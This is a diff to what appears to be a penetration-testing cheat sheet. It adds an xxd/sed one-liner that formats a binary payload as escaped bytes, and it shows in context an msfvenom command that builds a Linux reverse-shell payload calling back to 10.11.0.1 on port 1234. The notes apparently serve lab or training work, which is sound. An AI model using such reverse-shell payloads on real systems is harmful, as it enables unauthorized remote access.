@@ -56,6 +56,8 @@ similar to Hashcat, JTR will store cracked hashes in a pot file.  Retrieve these
 Directories in Path variable
 export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
+Print a binary file in program code readable format:
+xxd -p payload.bin | sed 's/../\\x&/g'
 
 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.1 LPORT=1234 CMD=/bin/sh PrependChrootBreak=true --smallest -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20\xff'
